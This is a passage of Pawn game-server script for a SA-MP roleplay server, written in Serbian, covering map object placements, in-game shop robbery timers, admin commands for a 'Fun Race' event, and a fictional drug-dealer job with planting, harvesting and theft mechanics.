	CreateDynamicObject(729, 635.15839, 7421.94434, 37.66524,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(791, 632.96014, 7456.86035, 33.21809,   0.00000, 0.00000, 245.97701);
	CreateDynamicObject(18228, 386.69208, 7479.37988, -16.77859,   0.00000, 0.00000, 306.00000);
	CreateDynamicObject(729, 628.03741, 7376.14453, 33.51057,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 383.30304, 7480.35547, -3.93975,   0.00000, 0.00000, 306.00000);
	CreateDynamicObject(18228, 428.67227, 7537.66504, 8.44025,   0.00000, 0.00000, 145.98500);
	CreateDynamicObject(729, 575.24091, 7539.56738, 39.47054,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(17031, 596.31042, 7529.31006, 24.13327,   19.98400, 0.00000, 295.98199);
	CreateDynamicObject(621, 369.55960, 7439.91699, 9.11768,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(709, 605.21649, 7329.36133, 34.26346,   0.00000, 0.00000, 185.98700);
	CreateDynamicObject(621, 366.81757, 7411.92480, 7.68964,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13212, 641.29376, 7475.94775, 15.25587,   0.00000, 0.00000, 195.99800);
	CreateDynamicObject(621, 457.91074, 7292.92090, 8.57005,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(791, 554.78369, 7558.87305, 32.94809,   0.00000, 0.00000, 225.96400);
	CreateDynamicObject(709, 501.55557, 7566.69922, 33.64346,   0.00000, 0.00000, 325.99301);
	CreateDynamicObject(709, 604.02795, 7535.11914, -8.12654,   0.00000, 0.00000, 243.97400);
	CreateDynamicObject(729, 620.84161, 7341.20654, 39.61073,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 416.60959, 7310.34180, 0.66025,   0.00000, 0.00000, 95.99300);
	CreateDynamicObject(1242, 630.38922, 7348.34863, 41.17300,   0.00000, 0.00000, 335.00000);
	CreateDynamicObject(729, 559.14825, 7288.18994, 32.88485,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(709, 654.43640, 7413.40479, 39.92346,   0.00000, 0.00000, 79.99200);
	CreateDynamicObject(709, 365.14462, 7469.39990, -29.31654,   0.00000, 0.00000, 123.99500);
	CreateDynamicObject(1543, 444.74426, 7562.97266, 29.80883,   0.00000, 0.00000, 38.00000);
	CreateDynamicObject(754, 447.53250, 7281.81348, 11.22845,   0.00000, 0.00000, 100.00000);
	CreateDynamicObject(9249, 351.21289, 7419.94824, -5.37579,   0.00000, 0.00000, 53.98700);
	CreateDynamicObject(791, 643.59821, 7351.66113, 34.96809,   0.00000, 0.00000, 159.97701);
	CreateDynamicObject(1543, 657.45758, 7451.12207, 48.42614,   0.00000, 0.00000, 162.00000);
	CreateDynamicObject(824, 657.45758, 7451.12207, 48.52614,   0.00000, 0.00000, 209.00000);
	CreateDynamicObject(18228, 430.53427, 7287.46777, 0.66025,   0.00000, 0.00000, 75.99300);
	CreateDynamicObject(18228, 357.53543, 7478.08057, 4.41025,   0.00000, 0.00000, 335.99701);
	CreateDynamicObject(621, 373.74496, 7341.05078, 7.95244,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(729, 613.19141, 7313.17480, 42.21175,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(760, 661.05646, 7436.89648, 46.55931,   0.00000, 0.00000, 354.00000);
	CreateDynamicObject(754, 347.63901, 7419.93945, 13.76990,   0.00000, 0.00000, 359.00000);
	CreateDynamicObject(17031, 665.97052, 7395.65039, 27.38327,   19.98800, 0.00000, 251.98300);
	CreateDynamicObject(13212, 640.65576, 7331.82422, 15.25587,   0.00000, 0.00000, 137.99600);
	CreateDynamicObject(13212, 527.80383, 7588.10889, 15.25587,   0.00000, 0.00000, 231.99899);
	CreateDynamicObject(709, 436.97061, 7570.72705, 31.62346,   0.00000, 0.00000, 231.99500);
	CreateDynamicObject(709, 521.23309, 7266.01074, 34.26346,   0.00000, 0.00000, 239.98199);
	CreateDynamicObject(824, 613.13300, 7548.82227, 40.39512,   0.00000, 0.00000, 129.00000);
	CreateDynamicObject(621, 385.48361, 7311.81641, 8.89284,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 358.46353, 7348.32422, 0.55025,   0.00000, 0.00000, 21.99300);
	CreateDynamicObject(733, 494.46954, 7591.42578, 40.58474,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(17031, 663.14410, 7363.21338, 31.59327,   3.98800, 0.00000, 317.98401);
	CreateDynamicObject(17031, 639.19128, 7323.12500, 34.84327,   3.99100, 0.00000, 335.98499);
	CreateDynamicObject(709, 596.77130, 7280.65234, -4.30654,   0.00000, 0.00000, 221.98100);
	CreateDynamicObject(17031, 586.68317, 7275.65186, 25.10327,   349.99100, 0.00000, 17.98500);
	CreateDynamicObject(754, 443.61871, 7581.74854, 36.98744,   0.00000, 0.00000, 345.00000);
	CreateDynamicObject(709, 679.74066, 7414.42236, 9.50346,   0.00000, 0.00000, 307.97800);
	CreateDynamicObject(18228, 460.15073, 7260.34961, 6.41025,   0.00000, 0.00000, 185.98199);
	CreateDynamicObject(1242, 545.17908, 7588.81152, 49.79732,   0.00000, 0.00000, 305.00000);
	CreateDynamicObject(760, 545.17908, 7588.81152, 49.89732,   0.00000, 0.00000, 140.00000);
	CreateDynamicObject(709, 660.75098, 7338.42480, 5.86346,   0.00000, 0.00000, 201.97900);
	CreateDynamicObject(9249, 362.16437, 7327.20166, -5.37579,   0.00000, 0.00000, 113.98300);
	CreateDynamicObject(791, 610.33893, 7286.01953, 36.71809,   0.00000, 0.00000, 159.98000);
	CreateDynamicObject(18228, 332.32318, 7460.82129, 7.05025,   0.00000, 0.00000, 45.99500);
	CreateDynamicObject(729, 659.51428, 7502.49902, 60.09995,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 437.59592, 7261.36328, 4.41025,   0.00000, 0.00000, 185.98300);
	CreateDynamicObject(791, 558.73462, 7256.88574, 33.29809,   0.00000, 0.00000, 105.98100);
	CreateDynamicObject(621, 332.50058, 7383.77686, 10.91936,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(706, 586.59521, 7588.27881, 22.59809,   0.00000, 0.00000, 359.99500);
	CreateDynamicObject(729, 642.71619, 7534.39746, 56.70582,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 325.02200, 7439.04688, 6.30025,   0.00000, 0.00000, 45.99400);
	CreateDynamicObject(824, 419.28296, 7267.56348, 32.86931,   0.00000, 0.00000, 78.00000);
	CreateDynamicObject(18228, 332.70166, 7485.84082, 4.98025,   0.00000, 0.00000, 335.99500);
	CreateDynamicObject(791, 470.37225, 7605.83447, 30.69809,   0.00000, 0.00000, 225.96100);
	CreateDynamicObject(706, 330.48239, 7481.64746, -15.01191,   0.00000, 0.00000, 5.98800);
	CreateDynamicObject(791, 388.31067, 7567.73486, 29.44809,   0.00000, 0.00000, 209.96100);
	CreateDynamicObject(18228, 349.89651, 7326.11133, 4.65025,   0.00000, 0.00000, 93.98800);
	CreateDynamicObject(13212, 545.65527, 7243.33154, 15.25587,   0.00000, 0.00000, 103.99400);
	CreateDynamicObject(706, 389.64752, 7574.50195, 4.32809,   0.00000, 0.00000, 307.99100);
	CreateDynamicObject(706, 475.36136, 7614.46875, 12.67809,   0.00000, 0.00000, 307.99500);
	CreateDynamicObject(729, 452.94495, 7245.67090, 33.66003,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 317.69547, 7454.11816, 11.26025,   0.00000, 0.00000, 295.99399);
	CreateDynamicObject(13212, 541.33606, 7615.13428, 24.60587,   0.00000, 0.00000, 229.99800);
	CreateDynamicObject(791, 525.59766, 7613.98291, 45.69809,   0.00000, 0.00000, 145.96800);
	CreateDynamicObject(729, 522.34070, 7238.14355, 45.69795,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18228, 342.75583, 7323.28223, 3.94025,   0.00000, 0.00000, 5.98900);
	CreateDynamicObject(18228, 331.30087, 7334.90381, 11.86025,   0.00000, 0.00000, 347.98901);
	CreateDynamicObject(13212, 383.71896, 7582.27734, 10.22587,   0.00000, 0.00000, 274.00000);
	CreateDynamicObject(791, 500.60864, 7229.32617, 35.83809,   0.00000, 0.00000, 123.98200);
	CreateDynamicObject(18228, 307.89154, 7429.96387, 6.30025,   0.00000, 0.00000, 295.99399);
	CreateDynamicObject(709, 658.55597, 7303.34766, 55.22346,   0.00000, 0.00000, 99.99100);
	CreateDynamicObject(17031, 466.00034, 7229.59375, 21.96327,   349.99100, 0.00000, 351.98999);
	CreateDynamicObject(13212, 677.31403, 7317.52002, 28.13587,   0.00000, 0.00000, 137.99400);
	CreateDynamicObject(18306, 637.22241, 7578.87305, 53.26341,   0.00000, 0.00000, 43.97000);
	CreateDynamicObject(768, 300.90781, 7445.69531, 15.77333,   0.00000, 0.00000, 150.00000);
	CreateDynamicObject(791, 405.40680, 7247.43945, 33.31809,   0.00000, 0.00000, 97.98500);
	CreateDynamicObject(768, 300.07748, 7412.34375, 12.02333,   0.00000, 0.00000, 163.99200);
	CreateDynamicObject(768, 299.37933, 7427.99463, 13.31333,   0.00000, 0.00000, 177.99600);
	CreateDynamicObject(13212, 697.92358, 7505.35986, 41.87587,   0.00000, 0.00000, 193.99600);
	CreateDynamicObject(768, 301.92654, 7464.30762, 18.52333,   0.00000, 0.00000, 163.99500);
	CreateDynamicObject(824, 555.57404, 7623.04004, 59.53969,   0.00000, 0.00000, 257.00000);
	CreateDynamicObject(709, 339.21036, 7548.57715, 37.87346,   0.00000, 0.00000, 89.99700);
	CreateDynamicObject(768, 302.26587, 7479.75391, 18.91333,   0.00000, 0.00000, 163.99300);
	CreateDynamicObject(709, 364.24176, 7272.28369, 35.89346,   0.00000, 0.00000, 305.97501);
	CreateDynamicObject(18306, 710.76727, 7475.43164, 53.26341,   0.00000, 0.00000, 11.97300);
	CreateDynamicObject(823, 553.13696, 7221.96338, 50.13712,   0.00000, 0.00000, 26.00000);
	CreateDynamicObject(1543, 548.25708, 7630.13379, 59.61085,   0.00000, 0.00000, 111.00000);
	CreateDynamicObject(729, 450.19284, 7221.03564, 40.85592,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(768, 304.18668, 7498.91602, 18.91333,   0.00000, 0.00000, 145.99300);
	CreateDynamicObject(733, 294.13770, 7448.37402, 37.20216,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(733, 292.98520, 7400.97852, 33.15609,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(709, 290.83994, 7420.59619, 33.49346,   0.00000, 0.00000, 167.99899);
	CreateDynamicObject(733, 331.67953, 7298.16797, 31.42511,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(729, 371.98682, 7257.67578, 41.72922,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(706, 324.83203, 7549.77246, 11.35809,   0.00000, 0.00000, 5.99100);
	CreateDynamicObject(709, 300.18839, 7357.40381, 34.49346,   0.00000, 0.00000, 94.00000);
	CreateDynamicObject(13212, 405.78177, 7229.09863, 15.25587,   0.00000, 0.00000, 59.99100);
	CreateDynamicObject(733, 305.48975, 7509.34766, 43.59043,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(824, 505.31219, 7206.26465, 49.54263,   0.00000, 0.00000, 104.00000);
	CreateDynamicObject(337, 550.45581, 7209.29004, 50.13712,   90.00000, 0.00000, 291.00000);
	CreateDynamicObject(823, 529.51166, 7201.47949, 50.13712,   0.00000, 0.00000, 349.00000);
	CreateDynamicObject(18306, 709.05322, 7324.06445, 53.26341,   0.00000, 0.00000, 335.97699);
	CreateDynamicObject(824, 461.42084, 7648.85840, 45.68649,   0.00000, 0.00000, 61.00000);
	CreateDynamicObject(733, 313.41754, 7543.45215, 50.07284,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(791, 308.52832, 7309.40723, 31.00809,   0.00000, 0.00000, 59.98700);
	CreateDynamicObject(791, 279.69736, 7463.96777, 35.59809,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(17031, 337.41422, 7589.10645, 35.63327,   350.00000, 0.00000, 250.00000);
	CreateDynamicObject(709, 296.98639, 7528.14111, 50.44346,   0.00000, 0.00000, 167.99699);
	CreateDynamicObject(709, 414.97311, 7639.68164, 60.45347,   0.00000, 0.00000, 231.99300);
	CreateDynamicObject(709, 298.14828, 7307.94727, -1.30654,   0.00000, 0.00000, 219.98500);
	CreateDynamicObject(17031, 280.71594, 7351.06738, 29.81327,   349.99100, 0.00000, 355.98999);
	CreateDynamicObject(17031, 282.58286, 7509.86328, 33.13327,   349.99701, 0.00000, 223.99899);
	CreateDynamicObject(709, 424.80154, 7203.22852, 53.10346,   0.00000, 0.00000, 167.98000);
	CreateDynamicObject(709, 321.07010, 7269.73242, -1.30654,   0.00000, 0.00000, 301.98499);
	CreateDynamicObject(709, 275.23370, 7502.05225, 3.58346,   0.00000, 0.00000, 93.99200);
	CreateDynamicObject(733, 274.41370, 7487.93359, 46.23814,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18306, 591.66388, 7198.26563, 53.26341,   0.00000, 0.00000, 297.97900);
	CreateDynamicObject(13212, 279.62341, 7525.91504, 16.64587,   0.00000, 0.00000, 303.98199);
	CreateDynamicObject(13212, 260.69272, 7466.54297, 18.64587,   0.00000, 0.00000, 343.98700);
	CreateDynamicObject(13212, 289.31424, 7302.05176, 15.25587,   0.00000, 0.00000, 9.99100);
	CreateDynamicObject(17031, 320.24490, 7259.14844, 32.96575,   0.00000, 0.00000, 322.00000);
	CreateDynamicObject(709, 258.42300, 7382.16064, 4.15346,   0.00000, 0.00000, 219.98801);
	CreateDynamicObject(18306, 531.73480, 7674.54199, 53.26341,   0.00000, 0.00000, 41.96700);
	CreateDynamicObject(791, 288.04099, 7558.47119, 52.57809,   0.00000, 0.00000, 332.00000);
	CreateDynamicObject(729, 400.53406, 7195.14990, 64.51914,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(17031, 304.06821, 7260.06543, 29.96575,   14.00000, 0.00000, 131.99800);
	CreateDynamicObject(791, 352.55331, 7633.73389, 56.52809,   0.00000, 0.00000, 209.96001);
	CreateDynamicObject(733, 293.00305, 7275.63672, 46.58322,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(17031, 307.75980, 7253.03271, 31.71575,   0.00000, 0.00000, 329.99799);
	CreateDynamicObject(1242, 328.47919, 7235.72461, 52.98808,   0.00000, 0.00000, 233.00000);
	CreateDynamicObject(17031, 242.02847, 7393.63574, 36.02327,   349.99100, 0.00000, 287.99500);
	CreateDynamicObject(791, 376.41537, 7196.77734, 57.85809,   0.00000, 0.00000, 97.98200);
	CreateDynamicObject(13212, 349.80438, 7643.64404, 34.95587,   0.00000, 0.00000, 265.99899);
	CreateDynamicObject(760, 305.18625, 7250.82715, 53.48231,   0.00000, 0.00000, 308.00000);
	CreateDynamicObject(823, 252.54245, 7345.68652, 58.30185,   0.00000, 0.00000, 148.00000);
	CreateDynamicObject(1578, 371.38040, 7655.53320, 69.47021,   0.00000, 0.00000, 194.00000);
	CreateDynamicObject(709, 242.38136, 7358.23047, 56.76346,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13212, 286.45947, 7593.91748, 34.95587,   0.00000, 0.00000, 333.99500);
	CreateDynamicObject(13212, 401.34421, 7169.37891, 40.87587,   0.00000, 0.00000, 59.99100);
	CreateDynamicObject(754, 232.16064, 7374.42578, 59.53464,   0.00000, 0.00000, 38.00000);
	CreateDynamicObject(760, 358.70071, 7661.50977, 69.83712,   0.00000, 0.00000, 325.00000);
	CreateDynamicObject(791, 248.16931, 7314.95117, 50.84809,   0.00000, 0.00000, 7.98700);
	CreateDynamicObject(18306, 439.52832, 7701.11084, 53.26341,   0.00000, 0.00000, 92.00000);
	CreateDynamicObject(18306, 419.58664, 7157.45508, 53.26341,   0.00000, 0.00000, 267.98099);
	CreateDynamicObject(733, 256.82263, 7279.79883, 60.51805,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(13212, 242.38197, 7289.34375, 33.37587,   0.00000, 0.00000, 1.97800);
	CreateDynamicObject(733, 271.85809, 7247.43506, 54.93170,   0.00000, 0.00000, 0.00000);
}

timer RobTrafika[1000](playerid)
{
	if(RobTrafikaKurac{playerid} != 0)
    {
        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, RobTrafikaKurac{playerid});
        RobTrafikaKurac{playerid} --;
        defer RobTrafika(playerid);
    }
    else
    {
    	if(PrekinuoRob{playerid} == 1)
    	{
    		PrekinuoRob{playerid} = 0;
    		return 0;
    	}
        RobTrafikaKurac{playerid} = 0;
        SendInfoMessage(playerid, "Uspesno si opljackao trafiku i dobio %d$ prljavog novca!", RobTrafikePrice);
        ClearAnimations(playerid);
        TogglePlayerControllable(playerid, 1);
        PlayerInfo[playerid][xRobanjeTrafike] = 30;
        DajPrljavNovac(playerid, RobTrafikePrice);
		//DajIgracuNovac(playerid, 6000);
		PostaviWanted(playerid, "Pljacka Trafike", "Nepoznat", 2);
    }
	return 1;
}

timer RobMarket[1000](playerid)
{
	if(RobMarketKurac{playerid} != 0)
    {
        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, RobMarketKurac{playerid});
        RobMarketKurac{playerid} --;
        defer RobMarket(playerid);
    }
    else
    {
    	if(PrekinuoRob{playerid} == 1)
    	{
    		PrekinuoRob{playerid} = 0;
    		return 0;
    	}
        RobMarketKurac{playerid} = 0;
        
        SendInfoMessage(playerid, "Uspesno si opljackao market i dobio %d$ prljavog novca!", RobMarketPrice);
		DajPrljavNovac(playerid, RobMarketPrice);
        PlayerInfo[playerid][xRobanjeMarketa] = 20;
		PostaviWanted(playerid, "Pljacka Marketa", "Nepoznat", 4);
    }
	return 1;
}

//========================= [ KOMANDE ZA FUNRACE BY V01D ] ================================//

CMD:frcount(playerid, params[])
{
	if(!isClanAdministracije(playerid)) return FunRaceMessage(playerid, "Samo admini i helperi!");
	if(FunRacePokrenut == 0) return FunRaceMessage(playerid, "Fun Race nije pokrenut!");
	if(FunRacePokrenut < 4) return FunRaceMessage(playerid, "Nema dovoljno igraca!");
	FunRacePocinje = true;
	foreach(new frplayers : FunRaceIgraci)
	{
		FunRaceMessage(frplayers, "Igra pocinje za 5 sekundi!");
		SetTimer("frcount4",1000,0);
		SetTimer("frcount3",2000,0);
		SetTimer("frcount2",3000,0);
		SetTimer("frcount1",4000,0);
		SetTimer("frcountgo",5000,0);
	}
	return 1;
}

CMD:pokrenifunrace(playerid, params[])
{
	if(!isClanAdministracije(playerid)) return FunRaceMessage(playerid, "Samo admini i helperi!");
	if(FunRacePokrenut >= 1) return FunRaceMessage(playerid, "Fun Race je vec pokrenut!");
	va_SendClientMessageToAll(-1, "[FunRace]Admin %s je pokrenuo Fun Race! /joinfunrace", ImeIgraca(playerid));
	Kapija = CreateObject(2990, -2694.95361, -2643.88721, 10.16450,   0.00000, 0.00000, 90.00000);
	FunRacePokrenut = 1;
	FunRacePocinje = false;
	return 1;
}

CMD:joinfunrace(playerid, params[])
{
	if(FunRacePokrenut == 0) return FunRaceMessage(playerid, "Fun Race nije pokrenut!");
	if(FunRace{playerid} == true) return FunRaceMessage(playerid, "Vec si u Fun Race-u!");
	if(FunRacePocinje == true) return FunRaceMessage(playerid, "Zakasnio si!");
	if(FunRacePokrenut == 11) return FunRaceMessage(playerid, "Slotovi su puni!");

	if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) return SendErrorMessage( playerid, "Momak, koliko znam ti si Game Helper?" );
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
	if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );
	if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
	if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
	if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
	if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
	if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");

	SetPlayerVirtualWorld(playerid, 1);
	FunRaceMessage(playerid, "Usao si u Fun Race!Igra uskoro pocinje, srecno! Da napustis Fun Race koristi /napustfr"); 
	FunRace{playerid} = true; 
	FunRacePokrenut++;

	FunRaceCP{playerid} = 0;
	FunRaceVoziloOff[playerid] = 0;

	Iter_Add(FunRaceIgraci, playerid);
	switch(FunRacePokrenut)
	{
		case 1: { SetPlayerPos(playerid, -2677.8455,-2646.6814,8.5866); }
		case 2: { SetPlayerPos(playerid, -2678.4250,-2643.7983,8.1130); }
		case 3: { SetPlayerPos(playerid, -2680.8767,-2641.5916,7.5605); }
		case 4: { SetPlayerPos(playerid, -2683.9041,-2641.6577,7.2835); }
		case 5: { SetPlayerPos(playerid, -2684.1782,-2644.1833,7.6243); }
		case 6: { SetPlayerPos(playerid, -2684.2847,-2646.4609,7.9450); }
		case 7: { SetPlayerPos(playerid, -2686.9932,-2646.7605,7.7321); }
		case 8: { SetPlayerPos(playerid, -2689.6938,-2644.4905,7.1467); }
		case 9: { SetPlayerPos(playerid, -2690.0769,-2641.4307,6.6661); }
		case 10: { SetPlayerPos(playerid, -2691.7625,-2647.8364,7.4368); }
	}
	return 1;
}

CMD:zaustavifr(playerid, params[])
{
	if(!isClanAdministracije(playerid)) return FunRaceMessage(playerid, "Samo admini i helperi!");
	if(FunRacePokrenut == 0) return FunRaceMessage(playerid, "FunRace nije pokrenut!");
	FunRacePokrenut = 0;
	ZauzetoMesto1 = 0;
	ZauzetoMesto2 = 0;
	ZauzetoMesto3 = 0;

    if(IsValidObject(Kapija))
        DestroyObject(Kapija);

	foreach(new frplayers : FunRaceIgraci)
	{
		FunRace{frplayers} = false;
		FunRaceCP{frplayers} = 0;
		FunRaceVoziloOff[frplayers] = 0;
		SetPlayerVirtualWorld(frplayers, 0);
		SpawnPlayer(frplayers);
	}
	Iter_Clear(HungerGamesIgraci);
	SendClientMessageToAll(0xC34848FF, "(FunRace) : {FFFFFF}Administrator je zaustavio FunRace!");
	return 1;
}

CMD:napustifr(playerid, params[])
{
	if(FunRacePokrenut == 0) return FunRaceMessage(playerid, "FunRace nije pokrenut!");
	if(FunRace{playerid} == false) return FunRaceMessage(playerid, "Nisi u FunRace-u!");
	FunRaceCP{playerid} = 0;
	FunRace{playerid} = false;
	FunRaceVoziloOff[playerid] = 0;
	SetPlayerVirtualWorld(playerid, 0);
	SpawnPlayer(playerid);
	FunRaceMessage(playerid, "Napustio si FunRace!");
	Iter_Remove(FunRaceIgraci, playerid);
	return 1;
}

//========================= [ TIMERI ZA FUNRACE BY V01D ] ================================//

forward frcount4();
forward frcount3();
forward frcount2();
forward frcount1();
forward frcountgo();

public frcount4()
{
	foreach(new igraci : FunRaceIgraci)
	{
		GameTextForPlayer(igraci, "4", 1000, 3);
	}
}

public frcount3()
{
	foreach(new igraci : FunRaceIgraci)
	{
		GameTextForPlayer(igraci, "3", 1000, 3);
	}
}

public frcount2()
{
	foreach(new igraci : FunRaceIgraci)
	{
		GameTextForPlayer(igraci, "2", 1000, 3);
	}
}

public frcount1()
{
	foreach(new igraci : FunRaceIgraci)
	{
		GameTextForPlayer(igraci, "1", 1000, 3);
	}
}

public frcountgo()
{
	foreach(new igraci : FunRaceIgraci)
	{
		GameTextForPlayer(igraci, "IGRA POCELA!", 1000, 3);
		DestroyObject(Kapija);
		Novi_SetPlayerCheckpoint(igraci, -2729.7944,-2653.7527,2.4482, 5.0);
		FunRaceCP{igraci} = 1;
	}
}

timer AdminDutyTimer[60000](playerid)
{
	if(AdminDuty[playerid])
	{
		PlayerInfo[playerid][xAdminDuty]++;
		defer AdminDutyTimer(playerid);
	}
	return 1;
}

//================================================== [ POSAO DILER DROGE BY V01D ] =======================================

CMD:posadidrogu(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Nisi diler!");
	if(PlayerInfo[playerid][xSeme] == 0) return SendErrorMessage(playerid, "Nemas semena!");
	if(PlayerInfo[playerid][xPosadioDrogu] >= 1) return SendErrorMessage(playerid, "Vec si posadio drogu!");
	new plant;
	if(sscanf(params, "i", plant)) return SendUsageMessage(playerid, "/posadidrogu [ID]");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ])) return SendErrorMessage(playerid, "Moras biti kod plantaze!");
	if(strcmp( PlantazaInfo[plant][drogaPosadio], "Niko", true )) return SendErrorMessage(playerid, "Ta plantaza je zauzeta!");
	new ime[MAX_PLAYER_NAME];
	GetPlayerName(playerid, ime, sizeof(ime));
	strmid(PlantazaInfo[plant][drogaPosadio],ime,0,strlen(ime),255);
	PlantazaInfo[plant][drogaVreme] = 300;
	SacuvajPlantazu(plant);
	PlantazaLabelUpdate(plant);

	PlayerInfo[playerid][xPosadioDrogu] = plant;
	defer DrogaPlantazaTimer(plant);

	PlayerInfo[playerid][xSeme]--;

    SavePlayer(playerid);
	SendInfoMessage(playerid, "Uspesno si posadio drogu! Sacekaj 5 minuta!");
	return 1;
}

CMD:uberidrogu(playerid, params[])
{
	if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Nisi diler!");
	if(PlayerInfo[playerid][xPosadioDrogu] == 0) return SendErrorMessage(playerid, "Nisi posadio drogu!");
	new plant;
	if(sscanf(params, "i", plant)) return SendUsageMessage(playerid, "/uberidrogu [ID]");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ])) return SendErrorMessage(playerid, "Moras biti kod plantaze!");
	new ime[MAX_PLAYER_NAME];
	GetPlayerName(playerid, ime, sizeof(ime));
	if(strcmp( PlantazaInfo[plant][drogaPosadio], ime, true )) return SendErrorMessage(playerid, "Ne mozes ubrati tudju plantazu!");
	if(PlantazaInfo[plant][drogaVreme] > 0) return SendErrorMessage(playerid, "Droga nije sazrela!");
	strmid(PlantazaInfo[plant][drogaPosadio],"Niko",0,strlen("Niko"),255);
	PlantazaInfo[plant][drogaVreme] = 0;
	SacuvajPlantazu(plant);
	PlantazaLabelUpdate(plant);

	PlayerInfo[playerid][xPosadioDrogu] = 0;

	PlayerInfo[playerid][xNeoDroga] += 100;
    SavePlayer(playerid);
	SendInfoMessage(playerid, "Uspesno si ubrao 100g neobradjene droge! Sada je obradi");
	return 1;
}

ptask dilerKradjaCooldown[1000](playerid) {

    if(PlayerInfo[playerid][xDilerUkrao] != 0) {
        PlayerInfo[playerid][xDilerUkrao]--;
        SavePlayer(playerid);
    }
    return 1;
}

CMD:ukradidrogu(playerid, params[]) {

    if(PlayerInfo[playerid][xPosao] != POSAO_DILER) return SendErrorMessage(playerid, "Nisi diler!");
    if(PlayerInfo[playerid][xAdmin] >= 1) return SendErrorMessage(playerid, "Admini ne mogu ovo!");
    if(PlayerInfo[playerid][xSupporter] >= 1) return SendErrorMessage(playerid, "Helperi ne mogu ovo!");
    if(PlayerInfo[playerid][xDilerUkrao] >= 1) return SendErrorMessage(playerid, "Moras sacekati jos %d sekundi!", PlayerInfo[playerid][xDilerUkrao]);
    new plant;
    if(sscanf(params, "i", plant)) return SendUsageMessage(playerid, "/ukradidrogu [ID]");
    if(!IsPlayerInRangeOfPoint(playerid, 2.0, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ])) return SendErrorMessage(playerid, "Moras biti kod plantaze!");

    if(!strcmp(PlantazaInfo[plant][drogaPosadio], "Niko", true )) return SendErrorMessage(playerid, "Ta plantaza nije posadjena!");
    new ime[MAX_PLAYER_NAME];
    GetPlayerName(playerid, ime, sizeof(ime));
    if(!strcmp( PlantazaInfo[plant][drogaPosadio], ime, true )) return SendErrorMessage(playerid, "Ne mozes ukrasti svoju plantazu!");
    if(PlantazaInfo[plant][drogaVreme] > 0) return SendErrorMessage(playerid, "Droga nije sazrela!");

    PlayerInfo[playerid][xDilerUkrao] = 180;
    SavePlayer(playerid);

    new sansa = RandomNew(1, 3);
    if(sansa == 2) {

        new igrac = GetPlayerIdFromName(PlantazaInfo[plant][drogaPosadio]);
        if(IsPlayerConnected(igrac)) {

            PlayerInfo[igrac][xPosadioDrogu] = 0;
            SavePlayer(igrac);
        }

        strmid(PlantazaInfo[plant][drogaPosadio],"Niko",0,strlen("Niko"),255);
        PlantazaInfo[plant][drogaVreme] = 0;
        SacuvajPlantazu(plant);
        PlantazaLabelUpdate(plant);

        PlayerInfo[playerid][xNeoDroga] += 50;
        SavePlayer(playerid);
        SendInfoMessage(playerid, "Uspesno si ukrao 50g neobradjene droge!");



        return 1;
    }
    else return SendErrorMessage(playerid, "Nisi uspeo da ukrades drogu!");
}

timer DrogaPlantazaTimer[1000](plant)
{

    if(PlantazaInfo[plant][drogaVreme] > 0) {

        PlantazaInfo[plant][drogaVreme]--;
        SacuvajPlantazu(plant);
        PlantazaLabelUpdate(plant);
        defer DrogaPlantazaTimer(plant);
    }
    else return PlantazaLabelUpdate(plant);

    return 1;
}

